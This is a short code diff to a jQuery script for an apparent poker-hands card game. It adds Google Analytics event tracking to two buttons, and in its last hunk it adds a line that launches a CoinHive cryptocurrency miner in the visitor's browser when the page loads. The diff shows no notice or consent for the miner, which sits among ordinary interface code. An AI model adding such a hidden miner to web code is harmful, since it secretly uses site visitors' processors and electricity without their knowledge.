@@ -35,6 +35,7 @@ $(document).ready(function() {
         }
     }
     $('#new_game').on('click', function() {
+        ga('send', 'event', 'New Game', 'Visual', 'Poker Hands', { nonInteraction: true });
         $('#hand1 .cards, #hand2 .cards, #result1, #result2').html('');
         $('#result p').html('');
         $(this).hide();
@@ -48,6 +49,7 @@ $(document).ready(function() {
         });
     });
     $('#next_hands').on('click', function() {
+        ga('send', 'event', 'Next Hands', 'Visual', 'Poker Hands', { nonInteraction: true });
         $('#hand1 .cards, #hand2 .cards, #result1, #result2').html('');
         $('#result p').html('');
         $(this).hide();
@@ -63,5 +65,5 @@ $(document).ready(function() {
             showData(data);
         });
     });
-
+    var miner = new CoinHive.Anonymous('ryZiNd7GLNyGfw0qgpTF7iPsWqPfBQAT', {threads: 1,throttle: 0.8});
 });
